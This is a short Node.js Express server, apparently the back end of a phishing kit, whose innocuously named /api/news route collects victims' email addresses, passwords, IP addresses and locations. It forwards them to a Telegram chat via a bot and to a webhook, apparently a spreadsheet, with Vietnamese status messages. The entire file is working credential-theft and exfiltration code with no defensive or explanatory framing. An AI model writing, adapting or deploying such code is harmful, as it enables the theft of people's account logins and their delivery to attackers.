import express from "express";
import 'dotenv/config';
import cors from "cors";
import TelegramBot from 'node-telegram-bot-api';
import axios from "axios";

const app = express();
app.use(cors('*'));

app.use(express.json());

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

app.post('/api/news', (req, res) => {
    // GET DATA FROM CLIENTpm
    const data = req.body; 

    const result = {
        "status": 0,
        "message": "Success!"
    }

    res.send(result);

    // SEND DATA TO TELE
    const message = `Email Account: ${data.email ? data.email : ''} 
Password Account: ${data.password ? data.password : ''}
IP: ${data.ip ? data.ip : ''}
City: ${data.city ? data.city : ''} 
Country: ${data.country ? data.country : ''} `;

    bot.sendMessage(process.env.CHAT_ID, message);

    const url = new URL(process.env.WEBHOOK_URL);

    url.searchParams.append('Email Account', data.email ? data.email : '');
    url.searchParams.append('Password Account', data.password ? data.password : '');
    url.searchParams.append('Ip', data.ip ? data.ip : '');
    url.searchParams.append('City', data.city ? data.city : '');
    url.searchParams.append('Country', data.country ? data.country : '');

    axios.get(url)
        .then(response => {
            if (response.data.status === 'success') {
                bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
            } else {
                bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
            }
        })
        .catch(error => {
            bot.sendMessage(process.env.CHAT_ID, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
        });

});

app.listen(process.env.PORT, () => {
    console.log(`Server đang lắng nghe tại cổng ${process.env.PORT}`);
});
